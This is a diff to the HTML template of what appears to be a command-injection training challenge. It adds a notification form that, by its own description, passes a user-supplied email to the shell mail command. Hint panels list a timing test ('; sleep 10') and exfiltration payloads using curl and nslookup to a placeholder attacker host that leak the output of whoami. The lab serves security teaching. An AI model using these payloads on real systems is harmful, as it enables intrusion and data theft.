@@ -48,7 +48,8 @@
                     </h2>
                     <div id="hint2" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            Test: <code>file.txt; sleep 10</code>. If response delays 10 seconds, you have command injection.
+                            Test: <code>file.txt; sleep 10</code>. If response delays 10 seconds, you have command
+                            injection.
                         </div>
                     </div>
                 </div>
@@ -61,7 +62,8 @@
                     </h2>
                     <div id="hint3" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            Exfiltrate data: <code>; curl http://attacker.com/$(whoami)</code> or use DNS: <code>; nslookup $(whoami).attacker.com</code>
+                            Exfiltrate data: <code>; curl http://attacker.com/$(whoami)</code> or use DNS:
+                            <code>; nslookup $(whoami).attacker.com</code>
                         </div>
                     </div>
                 </div>
@@ -95,8 +97,38 @@
             </div>
         </div>
 
-        <div class="app-frame p-4">
-            <p class="text-muted">Challenge interface for Command Injection Level 3</p>
+        <div class="card border-0 shadow-sm mb-4">
+            <div class="card-header bg-transparent border-0 d-flex align-items-center">
+                <i class="bi bi-envelope-paper me-2 text-primary"></i>
+                <h6 class="mb-0">System Notification Service</h6>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info small py-2 mb-3">
+                    <i class="bi bi-info-circle me-1"></i> This service sends email notifications via the system shell
+                    mail command.
+                </div>
+
+                <form method="POST">
+                    <div class="mb-3">
+                        <label for="email" class="form-label small fw-bold text-muted">Recipient Email</label>
+                        <input type="email" class="form-control form-control-sm" id="email" name="email"
+                            value="{{ email }}" placeholder="admin@example.com">
+                    </div>
+                    <div class="d-grid">
+                        <button type="submit" class="btn btn-primary btn-sm">
+                            <i class="bi bi-send me-1"></i> Send Test Notification
+                        </button>
+                    </div>
+                </form>
+
+                {% if status %}
+                <div class="mt-4">
+                    <div class="alert alert-success small py-2 mb-0">
+                        <i class="bi bi-check-circle me-1"></i> {{ status }}
+                    </div>
+                </div>
+                {% endif %}
+            </div>
         </div>
     </div>
 </div>
